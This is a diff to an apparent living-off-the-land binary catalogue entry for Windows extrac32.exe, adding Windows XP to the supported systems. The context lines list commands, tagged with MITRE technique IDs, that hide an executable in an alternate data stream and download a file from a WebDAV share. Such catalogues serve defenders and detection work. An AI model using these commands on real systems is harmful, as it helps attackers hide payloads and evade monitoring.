@@ -10,7 +10,7 @@ Commands:
     Category: ADS
     Privileges: User
     MitreID: T1564.004
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Type: Compression
   - Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe
@@ -19,7 +19,7 @@ Commands:
     Category: ADS
     Privileges: User
     MitreID: T1564.004
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
       - Type: Compression
   - Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
@@ -28,14 +28,14 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1105
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe
     Description: Command for copying calc.exe to another folder
     Usecase: Copy file
     Category: Copy
     Privileges: User
     MitreID: T1105
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\extrac32.exe
   - Path: C:\Windows\SysWOW64\extrac32.exe
